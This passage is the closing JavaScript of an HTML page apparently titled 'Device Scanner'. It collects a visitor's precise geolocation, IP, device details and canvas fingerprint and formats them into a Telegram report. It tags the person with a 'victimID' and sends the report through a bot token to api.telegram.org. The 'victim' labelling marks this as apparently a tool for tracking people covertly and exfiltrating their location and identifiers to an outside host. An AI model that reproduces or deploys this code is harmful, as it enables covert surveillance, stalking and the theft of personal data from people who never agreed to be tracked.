                const modal = bootstrap.Modal.getInstance(document.querySelector('#telegramModalInstance'));
                if (modal) modal.hide();
                
            } catch (error) {
                console.error('Failed to send data:', error);
                showToast(`Failed to send: ${error.message}`, 'error');
            }
        }

        async function collectDashboardData() {
            // Refresh all data
            await refreshDeviceInfo();
            await refreshNetworkInfo();
            
            // Collect location if available
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });
                    
                    deviceData.locationInfo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                } catch (error) {
                    // Location not available
                }
            }
            
            // Generate fingerprint
            generateFingerprint();
        }

        function formatDashboardTelegramMessage() {
            let message = `üì± *DEVICE INFORMATION REPORT*\n\n`;
            message += `‚è∞ *Time:* ${new Date().toLocaleString()}\n`;
            message += `üÜî *ID:* ${deviceData.victimID || 'Not generated'}\n\n`;
            
            if (deviceData.deviceInfo) {
                message += `üìä *Device Information:*\n`;
                message += `‚Ä¢ Platform: ${deviceData.deviceInfo.platform || 'Unknown'}\n`;
                message += `‚Ä¢ Device: ${getDeviceName()}\n`;
                message += `‚Ä¢ Resolution: ${window.screen.width} x ${window.screen.height}\n`;
                message += `‚Ä¢ User Agent: \`${navigator.userAgent.substring(0, 50)}...\`\n\n`;
            }
            
            if (deviceData.networkInfo?.ipv4) {
                message += `üåê *Network Information:*\n`;
                message += `‚Ä¢ IP: \`${deviceData.networkInfo.ipv4}\`\n`;
                message += `‚Ä¢ Type: ${deviceData.networkInfo.connectionType || 'Unknown'}\n`;
                message += `‚Ä¢ Status: ${deviceData.networkInfo.onlineStatus || 'Unknown'}\n\n`;
            }
            
            if (deviceData.locationInfo?.latitude) {
                message += `üìç *Location:*\n`;
                message += `‚Ä¢ Lat: ${deviceData.locationInfo.latitude.toFixed(6)}\n`;
                message += `‚Ä¢ Lon: ${deviceData.locationInfo.longitude.toFixed(6)}\n`;
                message += `‚Ä¢ Accuracy: ${deviceData.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters\n`;
                message += `‚Ä¢ Map: https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}\n\n`;
            }
            
            if (deviceData.fingerprintInfo?.canvas) {
                message += `üÜî *Fingerprint:*\n`;
                message += `‚Ä¢ Hash: \`${deviceData.fingerprintInfo.canvas.substring(0, 32)}...\`\n`;
                message += `‚Ä¢ Timezone: ${deviceData.fingerprintInfo.timezone || 'Unknown'}\n\n`;
            }
            
            message += `_Report generated by Device Information Scanner_`;
            
            return message;
        }

        async function testTelegramConnection() {
            const botToken = document.getElementById('modal-bot-token')?.value || telegramConfig.botToken;
            
            if (!botToken) {
                showToast('Please enter bot token first', 'error');
                return;
            }
            
            try {
                showToast('Testing Telegram connection...', 'info');
                
                const url = `https://api.telegram.org/bot${botToken}/getMe`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.ok) {
                    showToast(`‚úÖ Connected to bot: ${data.result.username}`, 'success');
                } else {
                    throw new Error(data.description || 'Invalid bot token');
                }
            } catch (error) {
                showToast(`‚ùå Connection failed: ${error.message}`, 'error');
            }
        }

        // ============================================
        // UTILITY FUNCTIONS
        // ============================================

        function getDeviceName() {
            const userAgent = navigator.userAgent.toLowerCase();
            
            if (userAgent.includes('iphone')) return 'iPhone';
            if (userAgent.includes('ipad')) return 'iPad';
            if (userAgent.includes('android')) return 'Android Device';
            if (userAgent.includes('windows')) return 'Windows PC';
            if (userAgent.includes('mac')) return 'Mac';
            if (userAgent.includes('linux')) return 'Linux PC';
            
            return 'Unknown Device';
        }

        function generateVictimID() {
            const timestamp = Date.now();
            const randomStr = Math.random().toString(36).substring(2, 10);
            const userAgentHash = simpleHash(navigator.userAgent).substring(0, 8);
            return `DEV-${timestamp.toString(36).substring(4)}-${randomStr}-${userAgentHash}`;
        }

        function generateNewVictimID() {
            const newId = generateVictimID();
            document.getElementById('victim-id').textContent = newId;
            deviceData.victimID = newId;
            
            // Update QR code
            const qrContainer = document.getElementById('qr-code-container');
            qrContainer.innerHTML = '';
            QRCode.toCanvas(newId, { width: 150, height: 150 }, function(error, canvas) {
                if (error) {
                    qrContainer.innerHTML = '<span>QR code failed</span>';
                } else {
                    qrContainer.appendChild(canvas);
                }
            });
            
            showToast('New Victim ID generated', 'success');
        }

        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16);
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function downloadData() {
            // Update timestamp
            deviceData.timestamp = new Date().toISOString();
            
            // Convert to JSON
            const dataStr = JSON.stringify(deviceData, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            
            // Create download link
            const downloadLink = document.createElement('a');
            downloadLink.href = URL.createObjectURL(dataBlob);
            downloadLink.download = `device-info-${new Date().toISOString().split('T')[0]}.json`;
            
            // Trigger download
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            showToast('Data downloaded successfully!', 'success');
        }

        function showToast(message, type = 'info') {
            // Remove existing toasts
            const existingToasts = document.querySelectorAll('.custom-toast');
            existingToasts.forEach(toast => toast.remove());
            
            // Create toast
            const toast = document.createElement('div');
            toast.className = 'custom-toast';
            
            let bgColor = 'bg-primary';
            let icon = 'fas fa-info-circle';
            
            if (type === 'success') {
                bgColor = 'bg-success';
                icon = 'fas fa-check-circle';
            } else if (type === 'error') {
                bgColor = 'bg-danger';
                icon = 'fas fa-exclamation-circle';
            } else if (type === 'warning') {
                bgColor = 'bg-warning';
                icon = 'fas fa-exclamation-triangle';
            }
            
            toast.innerHTML = `
                <div class="toast show" role="alert">
                    <div class="toast-header ${bgColor} text-white">
                        <i class="${icon} me-2"></i>
                        <strong class="me-auto">Device Scanner</strong>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="toast"></button>
                    </div>
                    <div class="toast-body">
                        ${message}
                    </div>
                </div>
            `;
            
            document.body.appendChild(toast);
            
            // Auto remove after 5 seconds
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.remove();
                }
            }, 5000);
            
            // Add close button functionality
            const closeBtn = toast.querySelector('.btn-close');
            if (closeBtn) {
                closeBtn.addEventListener('click', () => {
                    toast.remove();
                });
            }
        }

        // ============================================
        // INITIALIZE WHEN LOADED
        // ============================================

        // Already initialized in DOMContentLoaded event
    </script>
</body>
</html>